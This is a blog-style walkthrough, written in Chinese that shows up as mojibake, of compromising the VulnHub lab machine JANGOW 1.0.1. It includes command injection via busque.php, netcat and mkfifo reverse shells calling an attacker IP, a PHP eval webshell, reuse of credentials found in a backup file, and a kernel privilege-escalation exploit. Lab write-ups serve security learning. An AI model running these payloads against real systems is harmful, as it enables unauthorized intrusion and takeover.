---
title: vulnhub åšé¢˜ JANGOW 1.0.1
tags: [penetration]
date: 2024-10-12 00:00:00
categories: [penetration]
excerpt: day1
---

---
title: 2023.11 æœˆèµ›
tags: [ctf-misc]
date: 2023-11-25 15:06:00
categories: [ctf-misc]
excerpt: æœˆèµ›writeup
---


## vulnhub åšé¢˜ JANGOW: 1.0.1


### ç”¨vmwareå¼€æœºåˆ†é…ä¸åˆ°ip

å¼€æœºæ—¶æŒ‰eè¿›å…¥gnu grubçš„booté€‰é¡¹é…ç½®ç•Œé¢ï¼ŒæŠŠlinuxä¸€è¡Œæœ€åçš„ ro æ”¹æˆ `rw single init=/bin/bash`, ctrl+x ä¿å­˜é‡å¯ã€‚

ip addr å¯ä»¥æŸ¥çœ‹æœ‰å“ªäº›ç½‘å¡ï¼Œç„¶åæ‰“å¼€ /etc/network/interfaces æŠŠ primary network interface é‡Œè¾¹çš„ç½‘å¡æ›¿æ¢æˆå·²æœ‰çš„ã€‚ï¼ˆä¹Ÿä¸çŸ¥é“è¿™ä¸ªinterfacesé‡Œå†™çš„ç½‘å¡æ˜¯å“ªé‡Œæ¥çš„ï¼Œå¯èƒ½æ˜¯å› ä¸ºæˆ‘ç”¨çš„vmwareä¸æ˜¯virtualboxï¼Ÿï¼‰

ï¼ˆè¿˜é‡åˆ°äº†é”®ç›˜æŒ‰/ç»“æœå‡ºæ¥çš„æ˜¯;çš„é—®é¢˜ï¼Œä¹Ÿä¸çŸ¥é“æ˜¯å’‹å›äº‹ğŸ˜´ï¼‰

`/etc/init.d/networking restart`, ç„¶åé‡å¯è™šæ‹Ÿæœº

è™½ç„¶æœ¬æ¥è¯¥æ˜¾ç¤ºipçš„REDE:è¿˜æ˜¯ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œ ä½†æ˜¯ nmap å·²ç»å¯ä»¥æ‰«åˆ°è¿™ä¸ªä¸»æœºäº†

```zsh
â””â”€$ nmap -sn 192.168.169.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-11 03:50 EDT
Nmap scan report for 192.168.169.2
Host is up (0.00053s latency).
Nmap scan report for 192.168.169.128
Host is up (0.00035s latency).
Nmap scan report for 192.168.169.129
Host is up (0.0022s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 3.03 seconds
```

### æ‰«æ

```zsh
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-06-10 18:05  site/
|_
|_http-title: Index of /
```

çœ‹åˆ°äº†webå’Œftpç«¯å£

### æ¼æ´ç‚¹

æ‰“å¼€è¿™ä¸ªwebï¼Œä¼šå‘Šè¯‰/siteè·¯å¾„ä¸‹æœ‰ä¸€ä¸ªç½‘ç«™

![](/img/pene/1.png)

ä¸€é¡¿ä¹±ç‚¹å‘ç°å³ä¸Šè§’è¿™ä¸ªBuscarä¼šè·³è½¬åˆ°ä¸€ä¸ªå¥‡æ€ªçš„è·¯å¾„ï¼Œ`http://192.168.169.129/site/busque.php?buscar=`ï¼Œè¿™ç§è·¯å¾„ç”¨kaliçš„dirbusterè¿˜æ‰¾ä¸åˆ°ã€‚çœ‹åˆ°æœ‰çš„é¢˜è§£è¯´ç”¨feroxbuster ~~ï¼ˆä½†æ˜¯è¿™ä¸œè¥¿è¦ä¸¤ä¸ªGï¼‰~~ï¼Œè€Œä¸”æˆ‘å®é™…ç”¨äº†ä¸€ä¸‹ä¹Ÿæ²¡æ‰«åˆ°è¿™ä¸ªbusque.phpğŸ˜¢ï¼Œå€’æ˜¯æ‰«åˆ°äº†wordpressè·¯å¾„ï¼Œä½†æ˜¯å’Œè¿™é“é¢˜æ²¡å…³ç³»ğŸ˜´

ç„¶åå¯¹è¿™ä¸ªphpçš„å‚æ•°ä¼ è¿›å»ä¸€ä¸ªlinuxå‘½ä»¤ï¼Œæ¯”å¦‚lsã€idã€psç­‰ç­‰ï¼Œå‘ç°èƒ½æ‰§è¡Œå¹¶å›æ˜¾ ~~ï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆå°±æƒ³åˆ°äº†è¾“ä¸ªlinuxå‘½ä»¤è¿›å»ï¼Œå¯èƒ½è¿™å°±æ˜¯å¤§ä½¬çš„ç»éªŒå§ï¼‰~~

å…¶å®è¿™ç§æƒ…å†µä¹Ÿå¯ä»¥è¯•è¯•æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå½¢å¦‚ `busque.php?buscar=../../../../../../etc/passwd`

çŸ¥é“äº†å¯ä»¥æ‰§è¡Œå‘½ä»¤å°è¯•ç”¨ncåå¼¹shellï¼Œ`which%20nc` å‘ç°ç¡®å®æœ‰nc

`nc -lvvp 6666`ç›‘å¬é“¾æ¥ï¼Œ`nc%20-e%20/bin/bash%20<attacker-ip>%206666`å°è¯•åå¼¹shell

ä½†æ˜¯ç›‘å¬ä¸åˆ°ä»»ä½•é“¾æ¥ğŸ˜­ï¼Œåªèƒ½æ¢ä¸ªæ–¹æ³•

å¯»æ‰¾sshç§é’¥  `cat%20/home/jangow01/.ssh/id_rsa` , ä¹Ÿæ²¡æœ‰å›æ˜¾

åªèƒ½åˆ°å¤„æ‰¾æ‰¾æœ‰æ²¡æœ‰ä»€ä¹ˆå¥‡æ€ªçš„æ–‡ä»¶äº†

é€šè¿‡catå¯ä»¥çœ‹åˆ°busque.phpå†…å®¹æ˜¯`?php system($_GET['buscar']); ?`ï¼Œç°åœ¨ä¹Ÿæ²¡ç”¨äº†

é€šè¿‡`ls -alh`åœ¨`/var/www/html`ä¸‹å‘ç°æœ‰ä¸€ä¸ª.backupsæ–‡ä»¶

```php
$servername = "localhost"; 
$database = "jangow01"; 
$username = "jangow01"; 
$password = "abygurl69"; // Create connection 
$conn = mysqli_connect($servername, $username, $password, $database); // Check connection 
if (!$conn) { die("Connection failed: " . mysqli_connect_error()); } echo "Connected successfully";
mysqli_close($conn); 
```

ç”±äºç«¯å£æ‰«ææ²¡å¼€sshæœåŠ¡ï¼Œå¹¶ä¸”å¼€äº†ftpæœåŠ¡ï¼Œçœ‹ä¸€ä¸‹æ˜¯ä¸æ˜¯è¿™ä¸ªç™»é™†å¯†ç 

```zsh
â””â”€$ ftp 192.168.169.129                          
Connected to 192.168.169.129.
220 (vsFTPd 3.0.3)
Name (192.168.169.129:kali): jangow01
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||14986|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        0            4096 Oct 31  2021 html
226 Directory send OK.
ftp> 
```

æˆåŠŸç™»å½• 

ç”Ÿæˆä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ 

`echo '<?php eval($_POST["cmd"]); ?>' > shell.php`

`echo%20%27%3C?php%20eval($_POST[%22cmd%22]);%20?%3E%27%20%3E%20shell.php`

> ä½†æ˜¯æˆ‘åœ¨å°è¯•ç”¨ftpä¸Šä¼ ä¸€ä¸ªshell.phpæ–‡ä»¶æ—¶ï¼Œä¼šæŠ¥é”™ï¼š553 Could not create file. åº”è¯¥æ˜¯æƒé™ä¸å¤Ÿï¼Œä½†æ˜¯ä¸‹è½½æ˜¯å¯ä»¥çš„
> é‚£è¿™é“é¢˜ç»™ftpçš„ç”¨æˆ·åå’Œå¯†ç æ˜¯ä¸ºäº†å•¥å‘¢ï¼Œåé¢ä¹Ÿç”¨ä¸åˆ°äº†ğŸ˜¶â€ğŸŒ«ï¸

ç”¨AntSwordé“¾æ¥ï¼Œåœ°å€æ˜¯ `http://192.168.169.129/site/shell.php` (è¦å¸¦ä¸Šsite) å¯†ç å°±æ˜¯è¦postçš„å‚æ•°åcmd

åˆ›å»ºä¸€ä¸ªç”¨æ¥åå¼¹shellçš„phpï¼Œrev.php

ç„¶åå†™å…¥`echo '<?php system("mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.169.128 443 >/tmp/f");?>' > rev.php`

> æˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆechoè¿›å»æ€»æ˜¯å¤±è´¥ï¼Œæœ€åç”¨çš„AntSwordçš„æ–‡ä»¶ç®¡ç†å†™è¿›å»çš„

è¿™é‡Œé€‰æ‹©443ç«¯å£æ˜¯å› ä¸ºå…¶ä½™ç«¯å£æœ‰é˜²ç«å¢™ï¼Œè€Œé¶æœºå¤§éƒ¨åˆ†æ˜¯ä¸ä¼šç¦80 443çš„

æµè§ˆå™¨è®¿é—®rev.phpï¼ŒæˆåŠŸæ‹¿åˆ°åå¼¹shell

```zsh
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo nc -nlvp 443            
[sudo] password for kali: 
listening on [any] 443 ...
connect to [192.168.169.128] from (UNKNOWN) [192.168.169.129] 52324
/bin/sh: 0: can't access tty; job control turned off
$ ls
assets
busque.php
css
index.html
js
rev.php
shell.php
wordpress
$ 
```


### ææƒ

é€šè¿‡whichå‘½ä»¤çŸ¥é“/usr/bin/python3ï¼Œç„¶åç”¨ pty æ–¹å¼æ¥å‡çº§shell
`/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'`

å¾—åˆ°äº†ä¸€ä¸ªæ­£å¸¸çš„shell

ç„¶åuname -aæŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬ï¼Œå‘ç°æ˜¯4.4.0-31-generic ubuntu

ç”¨kaliçš„searchsploitæœç´¢ææƒä»£ç ï¼Œç„¶åç”¨ftpæˆ–è€…AntSwordä¸Šä¼ åˆ°é¶æœºä¸Š

`/usr/share/exploitdb/exploits/linux/local/45010.c`

ç¼–è¯‘æ‰§è¡ŒææƒæˆåŠŸ

![](/img/pene/2.png)